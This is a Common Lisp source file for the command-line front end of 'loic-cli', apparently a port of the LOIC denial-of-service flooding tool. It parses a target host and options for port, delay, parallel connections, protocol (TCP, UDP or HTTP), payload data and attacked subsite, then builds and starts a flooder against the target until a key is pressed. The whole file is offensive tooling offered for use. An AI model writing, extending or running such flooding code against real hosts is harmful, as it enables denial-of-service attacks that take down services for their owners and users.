
(in-package loic-cli)

(defparameter options '((port (port "80" "Target port"))
                        (delay (delay "1" "Delay between attacks in seconds. Between 0 and 20"))
                        (connections (connections "100" "Parallel connections. Between 1 and 100"))
                        (protocol ((#\P protocol) "TCP" "Protocol to use. Can be TCP, UDP or HTTP"))
                        (data ((#\D data) ":P" "Data to send. Has no effect on HTTP"))
                        (subsite (subsite "/" "Subsite to attack. Only HTTP"))
                        (random (random nil "Append a random string to subsite. Only HTTP"))
                        (timeout (timeout "60" "Connection timeout for HTTP attacks in seconds"))))

(defparameter desc "Usage: loic-cli [OPTIONS] <TARGET>~%Target can be either hostname or ip~%Summary: ~%~@{~A~%~}~%")

(defmacro try-param (name process)
  (let ((slot-name (gensym "SLOT")))
    `(let ((param ,(if (listp name)
                     (car name)
                     name))
           (,slot-name ,(if (listp name)
                          `',(cadr name)
                          `',name)))
       (when param
         (setf (slot-value flooder ,slot-name) ,process)))))

(defun main (&optional (params (cli-options)))
  (handler-case
    (eval `(with-cli-options (',params ,desc) ,options
                             (if (null free)
                               (print-usage-summary desc (mapcar #'cadr options))
                               (let ((flooder (make-instance (case (intern (string-upcase protocol) :keyword)
                                                               ((:http) 'http-flooder)
                                                               ((:udp) 'udp-flooder)
                                                               ((:tcp) 'tcp-flooder)
                                                               (t 'tcp-flooder)))))
                                 (setf (target-ip flooder) (car free))
                                 (try-param (port target-port) (parse-integer param))
                                 (try-param delay (parse-integer param))
                                 (try-param connections (parse-integer param))
                                 ; Protocol specific parameters
                                 (ignore-errors (try-param (random add-random-subsite) param))
                                 (ignore-errors (try-param data param))
                                 (ignore-errors (try-param subsite param))
                                 (ignore-errors (handler-case (try-param timeout (parse-integer param))
                                                  (sb-int:simple-parse-error (c) (declare (ignore c))
                                                                             "You have junk in some numbers")))
                                 (start-flooder flooder)
                                 (read-char)
                                 (stop-flooder flooder)))))
    (sb-sys:interactive-interrupt (c) nil)
    (sb-int:simple-parse-error (c) (princ "You have junk in some numbers")))
  (fresh-line))

; vim: set lisp softtabstop=2 expandtab filetype=lisp:
